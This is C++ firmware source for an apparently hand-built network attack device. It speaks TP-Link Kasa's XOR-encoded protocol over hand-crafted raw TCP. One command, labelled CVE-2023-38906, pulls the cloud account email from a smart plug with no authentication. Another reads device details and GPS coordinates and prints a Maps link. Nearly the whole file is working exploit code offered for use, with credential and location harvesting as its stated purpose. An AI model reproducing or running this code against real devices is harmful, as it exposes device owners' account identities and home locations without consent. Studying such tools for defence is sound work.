// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 0x4133

#include "svc_kasa.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <Arduino.h>
#include <Ethernet2.h>
#include <utility/socket.h>
#include <utility/w5500.h>

#include "arp_table.h"
#include "config.h"
#include "eth_frame.h"
#include "ids.h"
#include "inject.h"
#include "ip_util.h"
#include "state.h"

static uint8_t kasaBuf[KASA_BUF_SIZE];  // Encrypt/decrypt + response buffer

// ══════════════════════════════════════════
//  TP-Link Kasa Smart Device Query
//  Protocol: XOR-encrypted JSON over TCP/9999
// ══════════════════════════════════════════

// ── Kasa XOR encrypt: 4-byte big-endian length prefix + XOR chain ──
uint16_t kasaEncrypt(const char* json, uint8_t* out, uint16_t maxOut) {
  uint16_t jsonLen = strlen(json);
  if (jsonLen + 4 > maxOut)
    return 0;

  // 4-byte big-endian length prefix
  out[0] = (jsonLen >> 24) & 0xFF;
  out[1] = (jsonLen >> 16) & 0xFF;
  out[2] = (jsonLen >> 8) & 0xFF;
  out[3] = jsonLen & 0xFF;

  uint8_t key = KASA_XOR_KEY;
  for (uint16_t i = 0; i < jsonLen; i++) {
    uint8_t a = key ^ (uint8_t)json[i];
    key = a;
    out[4 + i] = a;
  }
  return jsonLen + 4;
}

// ── Kasa XOR decrypt: skip 4-byte length prefix, reverse XOR chain ──
uint16_t kasaDecrypt(const uint8_t* data, uint16_t len, char* out, uint16_t maxOut) {
  if (len <= 4)
    return 0;
  uint16_t payloadLen = len - 4;
  if (payloadLen >= maxOut)
    payloadLen = maxOut - 1;

  uint8_t key = KASA_XOR_KEY;
  for (uint16_t i = 0; i < payloadLen; i++) {
    out[i] = (char)(key ^ data[4 + i]);
    key = data[4 + i];
  }
  out[payloadLen] = '\0';
  return payloadLen;
}

// ── Tiny JSON value extractor (no allocator needed) ──
// Finds "key": "value" or "key": number in a JSON string.
// Returns pointer to start of value, sets len. Returns NULL if not found.
static const char* kasaJsonFind(const char* json, const char* key, uint16_t* valLen) {
  const char* p = json;
  uint16_t keyLen = strlen(key);

  while ((p = strstr(p, key)) != NULL) {
    // Check it's a proper key (preceded by ")
    if (p > json && *(p - 1) == '"') {
      const char* afterKey = p + keyLen;
      if (*afterKey == '"') {
        // Skip ":<whitespace>
        afterKey++;
        while (*afterKey == ':' || *afterKey == ' ')
          afterKey++;

        if (*afterKey == '"') {
          // String value
          const char* valStart = afterKey + 1;
          const char* valEnd = strchr(valStart, '"');
          if (valEnd) {
            *valLen = valEnd - valStart;
            return valStart;
          }
        } else if (*afterKey == '-' || (*afterKey >= '0' && *afterKey <= '9')) {
          // Numeric value
          const char* valStart = afterKey;
          const char* valEnd = valStart;
          while (*valEnd == '-' || *valEnd == '.' || (*valEnd >= '0' && *valEnd <= '9'))
            valEnd++;
          *valLen = valEnd - valStart;
          return valStart;
        }
      }
    }
    p++;
  }
  *valLen = 0;
  return NULL;
}

// Helper: extract a JSON string value into a buffer
static bool kasaJsonStr(const char* json, const char* key, char* out, uint16_t maxOut) {
  uint16_t vLen;
  const char* v = kasaJsonFind(json, key, &vLen);
  if (!v || vLen == 0)
    return false;
  if (vLen >= maxOut)
    vLen = maxOut - 1;
  memcpy(out, v, vLen);
  out[vLen] = '\0';
  return true;
}

// Helper: extract a JSON integer value
static bool kasaJsonInt(const char* json, const char* key, int32_t* out) {
  uint16_t vLen;
  const char* v = kasaJsonFind(json, key, &vLen);
  if (!v || vLen == 0)
    return false;
  char tmp[16];
  if (vLen >= sizeof(tmp))
    return false;
  memcpy(tmp, v, vLen);
  tmp[vLen] = '\0';
  *out = atol(tmp);
  return true;
}

// ── Generic Kasa TCP transport ──
// Sends jsonCmd to targetIP:9999, returns decrypted JSON in outJson.
// Returns length of decrypted JSON, or -1 on error.
int16_t kasaSendRecv(const uint8_t* targetIP, const char* jsonCmd, char* outJson, uint16_t maxOut) {
  // Resolve target MAC
  uint8_t dstMAC[6];
  if (!resolveMacForIP(targetIP, dstMAC)) {
    Serial.println("[KASA] Failed to resolve target MAC. Try: recon sweep first.");
    return -1;
  }

  // Encrypt the command
  uint16_t encLen = kasaEncrypt(jsonCmd, kasaBuf, KASA_BUF_SIZE);
  if (encLen == 0) {
    Serial.println("[KASA] Encrypt failed.");
    return -1;
  }

  static uint16_t ephPort = 42000;
  uint16_t srcPort = ephPort++;
  if (ephPort > 59000)
    ephPort = 42000;

  // ── Phase 1: SYN ──
  uint16_t frameLen = buildTcpSyn(txBuf, dstMAC, ourIP, targetIP, srcPort, KASA_PORT);
  sendRawFrame(txBuf, frameLen);

  // ── Phase 2: Wait for SYN-ACK ──
  uint32_t deadline = millis() + KASA_TIMEOUT_MS;
  bool gotSynAck = false;
  uint32_t serverSeq = 0;
  uint32_t mySeq = 0;

  while (millis() < deadline) {
    uint16_t rxSize = w5500.getRXReceivedSize(RAW_SOCKET);
    if (rxSize == 0) {
      delay(1);
      continue;
    }

    uint16_t len = recvfrom(RAW_SOCKET, packetBuf, MAX_FRAME_SIZE, NULL, NULL);
    if (len < ETH_HEADER_LEN + 40)
      continue;
    if (pktRead16(packetBuf + ETH_TYPE) != ETHERTYPE_IPV4)
      continue;

    const uint8_t* ipH = packetBuf + ETH_HEADER_LEN;
    if (ipH[9] != IP_PROTO_TCP)
      continue;
    if (memcmp(ipH + 12, targetIP, 4) != 0)
      continue;

    uint8_t ihl = (ipH[0] & 0x0F) * 4;
    const uint8_t* tcpH = ipH + ihl;
    if (pktRead16(tcpH) != KASA_PORT || pktRead16(tcpH + 2) != srcPort)
      continue;

    uint8_t flags = tcpH[13];
    if ((flags & 0x12) == 0x12) {  // SYN+ACK
      serverSeq = pktRead32(tcpH + 4);
      mySeq = pktRead32(tcpH + 8);  // Server's ACK = our real SYN seq + 1
      gotSynAck = true;
      break;
    }
    if (flags & 0x04) {  // RST
      Serial.println("[KASA] Connection refused (RST).");
      return -1;
    }
  }

  if (!gotSynAck) {
    Serial.println("[KASA] No SYN-ACK — device not responding on port 9999.");
    return -1;
  }

  // ── Phase 3: Complete handshake — send ACK ──
  uint32_t myAck = serverSeq + 1;

  frameLen = buildTcpAck(txBuf, dstMAC, ourIP, targetIP, srcPort, KASA_PORT, mySeq, myAck);
  sendRawFrame(txBuf, frameLen);
  delay(5);

  // ── Phase 4: Send encrypted Kasa command via PSH+ACK ──
  frameLen = buildTcpDataPush(txBuf, dstMAC, ourIP, targetIP, srcPort, KASA_PORT, mySeq, myAck,
                              kasaBuf, encLen);
  sendRawFrame(txBuf, frameLen);
  mySeq += encLen;

  // ── Phase 5: Read response (may arrive in multiple segments) ──
  uint16_t respLen = 0;
  deadline = millis() + KASA_TIMEOUT_MS;

  while (millis() < deadline && respLen < KASA_BUF_SIZE - 1) {
    uint16_t rxSize = w5500.getRXReceivedSize(RAW_SOCKET);
    if (rxSize == 0) {
      delay(1);
      continue;
    }

    uint16_t len = recvfrom(RAW_SOCKET, packetBuf, MAX_FRAME_SIZE, NULL, NULL);
    if (len < ETH_HEADER_LEN + 40)
      continue;
    if (pktRead16(packetBuf + ETH_TYPE) != ETHERTYPE_IPV4)
      continue;

    const uint8_t* ipH = packetBuf + ETH_HEADER_LEN;
    if (ipH[9] != IP_PROTO_TCP)
      continue;
    if (memcmp(ipH + 12, targetIP, 4) != 0)
      continue;

    uint8_t ihl = (ipH[0] & 0x0F) * 4;
    const uint8_t* tcpH = ipH + ihl;
    if (pktRead16(tcpH) != KASA_PORT || pktRead16(tcpH + 2) != srcPort)
      continue;

    uint8_t flags = tcpH[13];
    uint8_t tcpHdrLen = ((tcpH[12] >> 4) & 0x0F) * 4;
    uint16_t ipTotalLen = pktRead16(ipH + 2);
    int payloadLen = ipTotalLen - ihl - tcpHdrLen;

    if (payloadLen > 0) {
      const uint8_t* payload = tcpH + tcpHdrLen;
      uint16_t copyLen = payloadLen;
      if (respLen + copyLen > KASA_BUF_SIZE)
        copyLen = KASA_BUF_SIZE - respLen;
      memcpy(kasaBuf + respLen, payload, copyLen);
      respLen += copyLen;

      // ACK the data
      uint32_t theirSeq = pktRead32(tcpH + 4);
      myAck = theirSeq + payloadLen;
      uint16_t ackFrame = buildTcpAck(txBuf, dstMAC, ourIP, targetIP, srcPort, KASA_PORT, mySeq,
                                      myAck);
      sendRawFrame(txBuf, ackFrame);

      // Check if we got the full message (4-byte length prefix tells us)
      if (respLen >= 4) {
        uint32_t expectedLen = ((uint32_t)kasaBuf[0] << 24) | ((uint32_t)kasaBuf[1] << 16) |
                               ((uint32_t)kasaBuf[2] << 8) | kasaBuf[3];
        if (respLen >= expectedLen + 4)
          break;  // Got full response
      }
    }

    if (flags & 0x01)
      break;  // FIN
  }

  // ── Phase 6: RST to tear down ──
  frameLen = buildTcpRst(txBuf, dstMAC, ourIP, targetIP, srcPort, KASA_PORT, mySeq);
  sendRawFrame(txBuf, frameLen);

  if (respLen <= 4) {
    Serial.println("[KASA] No response data received.");
    return -1;
  }

  // ── Decrypt response ──
  uint16_t jsonLen = kasaDecrypt(kasaBuf, respLen, outJson, maxOut);
  if (jsonLen == 0) {
    Serial.println("[KASA] Decrypt failed.");
    return -1;
  }

  return (int16_t)jsonLen;
}

// ── Query sysinfo (device details + GPS) ──
void kasaQuerySysinfo(const uint8_t* targetIP) {
  Serial.printf("[KASA] Querying sysinfo %u.%u.%u.%u ...\n", targetIP[0], targetIP[1], targetIP[2],
                targetIP[3]);
  idsSetLed(COLOR_YELLOW);

  static char jsonResp[KASA_BUF_SIZE];
  int16_t jsonLen = kasaSendRecv(targetIP, "{\"system\":{\"get_sysinfo\":{}}}", jsonResp,
                                 KASA_BUF_SIZE);
  if (jsonLen < 0) {
    idsSetLed(capturing ? COLOR_GREEN : COLOR_BLUE);
    return;
  }

  char val[128];
  int32_t numVal;

  Serial.println();
  Serial.println("  ┌─────────────────────────────────────────────────────────────┐");
  Serial.println("  │                  Kasa Device Information                    │");
  Serial.println("  └─────────────────────────────────────────────────────────────┘");
  Serial.println();

  if (kasaJsonStr(jsonResp, "alias", val, sizeof(val)))
    Serial.printf("  Device:     %s\n", val);

  if (kasaJsonStr(jsonResp, "model", val, sizeof(val)))
    Serial.printf("  Model:      %s\n", val);

  if (kasaJsonStr(jsonResp, "dev_name", val, sizeof(val)))
    Serial.printf("  Dev Name:   %s\n", val);

  if (kasaJsonStr(jsonResp, "mac", val, sizeof(val)))
    Serial.printf("  MAC:        %s\n", val);

  if (kasaJsonStr(jsonResp, "hw_ver", val, sizeof(val)))
    Serial.printf("  Hardware:   %s\n", val);

  if (kasaJsonStr(jsonResp, "sw_ver", val, sizeof(val)))
    Serial.printf("  Firmware:   %s\n", val);

  if (kasaJsonStr(jsonResp, "deviceId", val, sizeof(val)))
    Serial.printf("  Device ID:  %s\n", val);

  if (kasaJsonInt(jsonResp, "relay_state", &numVal))
    Serial.printf("  Relay:      %s\n", numVal ? "ON" : "OFF");

  if (kasaJsonInt(jsonResp, "rssi", &numVal))
    Serial.printf("  RSSI:       %ld dBm\n", numVal);

  // GPS coordinates
  int32_t lat_i = 0, lon_i = 0;
  bool hasLat = kasaJsonInt(jsonResp, "latitude_i", &lat_i);
  bool hasLon = kasaJsonInt(jsonResp, "longitude_i", &lon_i);

  if (!hasLat)
    hasLat = kasaJsonInt(jsonResp, "latitude", &lat_i);
  if (!hasLon)
    hasLon = kasaJsonInt(jsonResp, "longitude", &lon_i);

  if (hasLat && hasLon) {
    int32_t latWhole = lat_i / 10000;
    int32_t latFrac = (lat_i < 0 ? -lat_i : lat_i) % 10000;
    int32_t lonWhole = lon_i / 10000;
    int32_t lonFrac = (lon_i < 0 ? -lon_i : lon_i) % 10000;

    Serial.printf("  Latitude:   %ld.%04ld\n", latWhole, latFrac);
    Serial.printf("  Longitude:  %ld.%04ld\n", lonWhole, lonFrac);
    Serial.printf("  Maps:       https://www.google.com/maps?q=%ld.%04ld,%ld.%04ld\n", latWhole,
                  latFrac, lonWhole, lonFrac);
  }

  Serial.println();
  Serial.printf("[KASA] Sysinfo: %u bytes decrypted.\n", jsonLen);
  idsSetLed(capturing ? COLOR_GREEN : COLOR_BLUE);
}

// ── Extract cloud account credentials (CVE-2023-38906) ──
// cnCloud get_info returns the TP-Link cloud account email, server, and bind state
// without any authentication over the local XOR protocol.
void kasaQueryCloud(const uint8_t* targetIP) {
  Serial.printf("[KASA] Extracting cloud credentials from %u.%u.%u.%u ...\n", targetIP[0],
                targetIP[1], targetIP[2], targetIP[3]);
  idsSetLed(COLOR_YELLOW);

  static char jsonResp[KASA_BUF_SIZE];

  // First get device context via sysinfo (single query, always works)
  int16_t sysLen = kasaSendRecv(targetIP, "{\"system\":{\"get_sysinfo\":{}}}", jsonResp,
                                KASA_BUF_SIZE);

  char alias[64] = "(unknown)";
  char model[32] = "";
  char devMac[24] = "";
  char fwVer[64] = "";
  char devId[64] = "";

  if (sysLen > 0) {
    kasaJsonStr(jsonResp, "alias", alias, sizeof(alias));
    kasaJsonStr(jsonResp, "model", model, sizeof(model));
    kasaJsonStr(jsonResp, "mac", devMac, sizeof(devMac));
    kasaJsonStr(jsonResp, "sw_ver", fwVer, sizeof(fwVer));
    kasaJsonStr(jsonResp, "deviceId", devId, sizeof(devId));
  }

  delay(100);  // Brief pause between TCP connections

  // Now query cloud info
  int16_t jsonLen = kasaSendRecv(targetIP, "{\"cnCloud\":{\"get_info\":{}}}", jsonResp,
                                 KASA_BUF_SIZE);
  if (jsonLen < 0) {
    idsSetLed(capturing ? COLOR_GREEN : COLOR_BLUE);
    return;
  }

  Serial.println();
  Serial.println("  ┌─────────────────────────────────────────────────────────────┐");
  Serial.println("  │              Kasa Cloud Account Credentials                 │");
  Serial.println("  │           CVE-2023-38906 — No Auth Required                │");
  Serial.println("  └─────────────────────────────────────────────────────────────┘");
  Serial.println();

  // Show device context first
  Serial.printf("  Device:     %s (%s)\n", alias, model);
  if (devMac[0])
    Serial.printf("  MAC:        %s\n", devMac);
  if (fwVer[0])
    Serial.printf("  Firmware:   %s\n", fwVer);
  if (devId[0])
    Serial.printf("  Device ID:  %s\n", devId);
  Serial.println();

  // Dump raw cloud JSON for full visibility
  Serial.println("  ── Raw Cloud Response ──");
  // Print in chunks to avoid serial buffer overflow
  const char* rp = jsonResp;
  uint16_t remaining = (uint16_t)jsonLen;
  while (remaining > 0) {
    uint16_t chunk = remaining > 120 ? 120 : remaining;
    Serial.printf("  %.*s\n", chunk, rp);
    rp += chunk;
    remaining -= chunk;
    delay(5);  // Let serial buffer drain
  }
  Serial.println();

  // Parse and display known fields
  char val[128];
  int32_t numVal;

  Serial.println("  ── Parsed Fields ──");

  // Username — the key credential. Handle empty string case.
  uint16_t vLen;
  const char* v = kasaJsonFind(jsonResp, "username", &vLen);
  if (v) {
    if (vLen > 0) {
      uint16_t copyLen = vLen < sizeof(val) - 1 ? vLen : sizeof(val) - 1;
      memcpy(val, v, copyLen);
      val[copyLen] = '\0';
      Serial.printf("  Account:    %s\n", val);
    } else {
      Serial.println("  Account:    (empty — no cloud account bound)");
    }
  }

  if (kasaJsonStr(jsonResp, "server", val, sizeof(val)))
    Serial.printf("  Cloud SVR:  %s\n", val);

  if (kasaJsonInt(jsonResp, "binded", &numVal))
    Serial.printf("  Bound:      %s\n", numVal ? "YES" : "NO");

  if (kasaJsonInt(jsonResp, "cld_connection", &numVal))
    Serial.printf("  Connected:  %s\n", numVal ? "YES" : "NO");

  if (kasaJsonInt(jsonResp, "illegalType", &numVal))
    Serial.printf("  Illegal:    %ld\n", numVal);

  if (kasaJsonInt(jsonResp, "tcspStatus", &numVal))
    Serial.printf("  TCSP:       %ld\n", numVal);

  if (kasaJsonInt(jsonResp, "fwNotifyType", &numVal))
    Serial.printf("  FW Notify:  %ld\n", numVal);

  if (kasaJsonInt(jsonResp, "err_code", &numVal))
    Serial.printf("  Err Code:   %ld\n", numVal);

  Serial.println();
  Serial.printf("[KASA] Cloud info: %u bytes decrypted.\n", jsonLen);
  idsSetLed(capturing ? COLOR_GREEN : COLOR_BLUE);
}

// ── Kasa command parser ──
void parseKasaCommand(const char* cmd) {
  while (*cmd == ' ')
    cmd++;

  if (*cmd == '\0') {
    Serial.println("[KASA] Usage:");
    Serial.println("  kasa <IP>          Query device sysinfo + GPS");
    Serial.println("  kasa cloud <IP>    Extract cloud account credentials");
    return;
  }

  // Check for "cloud" subcommand
  if (strncmp(cmd, "cloud ", 6) == 0) {
    const char* ipStr = cmd + 6;
    while (*ipStr == ' ')
      ipStr++;
    uint8_t targetIP[4];
    if (!parseIP(ipStr, targetIP)) {
      Serial.println("[KASA] Invalid IP. Usage: kasa cloud 192.168.50.109");
      return;
    }
    kasaQueryCloud(targetIP);
    return;
  }

  uint8_t targetIP[4];
  if (!parseIP(cmd, targetIP)) {
    Serial.println("[KASA] Invalid IP. Usage: kasa 192.168.50.109");
    return;
  }

  kasaQuerySysinfo(targetIP);
}
